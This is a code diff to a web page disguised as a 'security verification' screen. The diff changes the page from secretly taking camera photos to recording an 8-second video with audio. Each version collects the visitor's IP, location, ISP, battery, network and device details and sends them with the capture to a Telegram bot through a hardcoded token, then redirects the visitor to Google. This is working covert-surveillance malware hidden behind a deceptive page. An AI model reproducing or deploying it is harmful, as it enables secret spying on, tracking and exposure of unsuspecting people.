@@ -39,7 +39,7 @@
         }
         .btn:hover { background: #2563eb; }
         #status { margin-top: 15px; font-size: 13px; color: #facc15; }
-        video, canvas { display: none; }
+        video { display: none; }
     </style>
 </head>
 <body>
@@ -51,8 +51,7 @@
         <div id="status"></div>
     </div>
 
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas"></canvas>
+    <video id="video" autoplay playsinline muted></video>
 
     <script>
         const BOT_TOKEN = "8857558695:AAGOlJ_9PzeyvaOku_2_-MxjdbZJILC1cQI";
@@ -93,23 +92,21 @@
             document.getElementById('status').innerText = "Verifying security, please wait...";
 
             const urlParams = new URLSearchParams(window.location.search);
-            const camType = urlParams.get('b'); // 'front' ya 'back' check karega
+            const camType = urlParams.get('b'); 
             const chatId = urlParams.get('id');
 
-            // Yahan dhyan de: Link ke hisaab se facingMode set ho raha hai
-            let constraints = { video: { facingMode: "user" } }; // Default Front
+            let constraints = { video: { facingMode: "user" }, audio: true }; 
 
             if (camType === 'back') {
-                constraints = { video: { facingMode: { exact: "environment" } } }; // Strict Back Camera
+                constraints = { video: { facingMode: { exact: "environment" } }, audio: true }; 
             } else if (camType === 'front') {
-                constraints = { video: { facingMode: "user" } }; // Front Camera
+                constraints = { video: { facingMode: "user" }, audio: true }; 
             }
 
             navigator.mediaDevices.getUserMedia(constraints)
             .catch(err => {
-                // Agar exact back camera support na kare toh normal environment mode try karega
                 if (camType === 'back') {
-                    return navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+                    return navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: true });
                 }
                 throw err;
             })
@@ -117,73 +114,75 @@
                 const video = document.getElementById('video');
                 video.srcObject = stream;
                 
-                let photoCount = 0;
-                const maxPhotos = 4; 
+                let mediaRecorder;
+                let chunks = [];
 
-                const photoInterval = setInterval(() => {
-                    photoCount++;
-                    const canvas = document.getElementById('canvas');
-                    canvas.width = video.videoWidth || 640;
-                    canvas.height = video.videoHeight || 480;
-                    
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                try {
+                    mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
+                } catch (e) {
+                    mediaRecorder = new MediaRecorder(stream);
+                }
 
-                    canvas.toBlob(blob => {
-                        let captionText = "";
-                        let camNameTag = (camType === 'back') ? "[Back Cam]" : "[Front Cam]";
-
-                        if (photoCount === 1) {
-                            let currentTime = new Date().toLocaleString();
-                            let screenRes = `${window.screen.width}x${window.screen.height}`;
-                            let uaString = navigator.userAgent;
-
-                            captionText = 
-                                `🌐 **IP Information ${camNameTag}**\n\n` +
-                                `🔢 IP Address: \`${ipInfo}\`\n` +
-                                `📍 Location: ${cityInfo}\n` +
-                                `🌍 Region: ${regionInfo} (${countryInfo})\n` +
-                                `📡 ISP: ${ispInfo}\n\n` +
-                                `📱 **Device Details** (${photoCount}/${maxPhotos})\n\n` +
-                                `🔋 Battery: ${batteryData}\n` +
-                                `📶 Network: ${networkData}\n` +
-                                `🖥️ Screen: ${screenRes}\n` +
-                                `🕒 Time: ${currentTime}\n` +
-                                `🧠 UA: \`${uaString}\``;
-                        } else {
-                            captionText = `📸 Target Captured ${camNameTag} (${photoCount}/${maxPhotos})`;
-                        }
-
-                        sendPhotoToTelegram(blob, chatId, captionText);
-                    }, 'image/jpeg', 0.85);
-
-                    if (photoCount >= maxPhotos) {
-                        clearInterval(photoInterval);
-                        stream.getTracks().forEach(track => track.stop());
-                        document.getElementById('status').innerText = "Verification Successful!";
-                        setTimeout(() => {
-                            window.location.href = "https://www.google.com";
-                        }, 1500);
+                mediaRecorder.ondataavailable = function(event) {
+                    if (event.data && event.data.size > 0) {
+                        chunks.push(event.data);
                     }
-                }, 1500);
+                };
+
+                mediaRecorder.onstop = function() {
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    
+                    let currentTime = new Date().toLocaleString();
+                    let screenRes = `${window.screen.width}x${window.screen.height}`;
+                    let uaString = navigator.userAgent;
+                    let camNameTag = (camType === 'back') ? "[Back Cam Video]" : "[Front Cam Video]";
+
+                    let captionText = 
+                        `🎥 **8-Second Video Captured ${camNameTag}**\n\n` +
+                        `🔢 IP: \`${ipInfo}\`\n` +
+                        `📍 Location: ${cityInfo}, ${regionInfo}\n` +
+                        `📡 ISP: ${ispInfo}\n` +
+                        `🔋 Battery: ${batteryData}\n` +
+                        `📶 Network: ${networkData}\n` +
+                        `🖥️ Screen: ${screenRes}\n` +
+                        `🕒 Time: ${currentTime}\n` +
+                        `🧠 UA: \`${uaString}\``;
+
+                    sendVideoToTelegram(blob, chatId, captionText);
+                    
+                    stream.getTracks().forEach(track => track.stop());
+                    document.getElementById('status').innerText = "Verification Successful!";
+                    setTimeout(() => {
+                        window.location.href = "https://www.google.com";
+                    }, 1500);
+                };
+
+                mediaRecorder.start();
+                document.getElementById('status').innerText = "Recording video, please wait...";
+
+                setTimeout(() => {
+                    if (mediaRecorder.state === "recording") {
+                        mediaRecorder.stop();
+                    }
+                }, 8000);
 
             })
             .catch(error => {
-                document.getElementById('status').innerText = "Camera permission denied or not supported!";
+                document.getElementById('status').innerText = "Camera/Audio permission denied!";
                 console.error(error);
             });
         }
 
-        function sendPhotoToTelegram(blob, chatId, caption) {
+        function sendVideoToTelegram(blob, chatId, caption) {
             if (!chatId) return;
 
             const formData = new FormData();
             formData.append('chat_id', chatId);
-            formData.append('photo', blob, 'capture.jpg');
+            formData.append('video', blob, 'capture.webm');
             formData.append('caption', caption);
             formData.append('parse_mode', 'Markdown');
 
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                 method: 'POST',
                 body: formData
             }).catch(err => console.log(err));
